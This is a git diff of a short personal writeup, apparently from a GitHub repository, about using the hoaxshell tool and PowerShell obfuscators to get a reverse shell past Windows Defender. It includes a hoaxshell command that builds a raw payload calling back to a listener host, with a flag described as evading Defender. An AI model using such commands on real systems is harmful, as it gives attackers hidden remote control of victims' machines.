@@ -1,24 +1,26 @@
 # hoaxshell
 
 Feb 23,
-```
+
 So I just want to share my writeup because I've been trying to bypass
 defender for sometime now and this is the first time I Officially bypassed
 Defender , I've spent countless hours obfuscating my powershell
 command using unicorn, invoke-obfuscation and chimera , I would highly
 suggest to watch t3l3machus it definitely helped me to bypass
 defender, thank you brother
-```
+
 ![2-1](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/2b438ba0-2e94-4c58-9e86-4a95ab128d5f)
 
 #1. Create a shell using Hoaxshell
+
 I used this command,
-
+```
 ./hoaxshell.py -s 192.168.50.46 -r -H 'Authorization'
-
+```
+`
 -r = raw payload
 -H = additional hoaxshell tag to bypass defender
-
+`
 
 and then it will spit out this shell here
 
